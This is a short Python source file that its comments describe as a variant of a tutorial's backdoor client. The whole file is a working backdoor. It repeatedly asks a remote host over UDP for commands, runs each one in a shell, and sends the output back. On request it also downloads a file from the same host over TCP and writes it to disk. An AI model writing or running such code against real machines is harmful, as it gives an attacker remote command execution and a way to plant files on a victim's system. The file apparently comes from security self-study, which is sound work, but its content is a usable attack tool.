# https://docs.python.org/3/library/socket.html#socket.SOCK_DGRAM
# used this to learn how to initialize socket.

# https://www.securecoding.com/blog/how-to-build-a-simple-backdoor-in-python/
# This file itself is an iteration on the client described here.

import socket
import subprocess
import sys

udp_buffer_size = 4096
tcp_buffer_size = 4096


def get_command(request, sock, host, port):
    print("[-] Requesting command...")
    sock.sendto(request, (host, port))
    return sock.recv(udp_buffer_size).decode()


# https://contenttool.io/text-difference-checker
# used this tool to confirm that the read and write functions worked.
def write_list_into_file(name, type, list):
    f = open(name, 'w{0}'.format(type))
    for s in list:
        f.write(s)
    f.close()


DEFAULT_HOST = 'localhost'
DEFAULT_PORT = 4444
DEFAULT_TRANSFER_PORT = 4445

REMOTE_HOST = DEFAULT_HOST
REMOTE_PORT = DEFAULT_PORT
REMOTE_TRANSFER_PORT = DEFAULT_TRANSFER_PORT

if len(sys.argv) > 1:
    REMOTE_HOST = sys.argv[1]

if len(sys.argv) > 2:
    REMOTE_PORT = int(sys.argv[2])

s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)

try:
    MAKE_REQUEST = bytes('REQUEST', 'utf-8')
    FILENAME_REQUEST = bytes('NAME', 'utf-8')
    FILE_REQUEST = bytes('FILE', 'utf-8')

    while True:
        command = get_command(MAKE_REQUEST, s, REMOTE_HOST, REMOTE_PORT)

        if command == 'file':
            file_name = get_command(FILENAME_REQUEST, s, REMOTE_HOST, REMOTE_PORT)
            tcp_connection = socket.socket()
            f = None
            try:
                tcp_connection.connect((REMOTE_HOST, REMOTE_TRANSFER_PORT))
                f = open(file_name, 'w')
                # TODO: loop tcp receive until done.
                f.write(tcp_connection.recv(tcp_buffer_size).decode())
            finally:
                f.close()
                tcp_connection.close()
        else:
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            print("[-] Sending response...")
            s.sendto(output + output_error, (REMOTE_HOST, REMOTE_PORT))

except ConnectionAbortedError:
    print("Connection severed")
except ConnectionResetError:
    print("Connection reset")
finally:
    s.close()
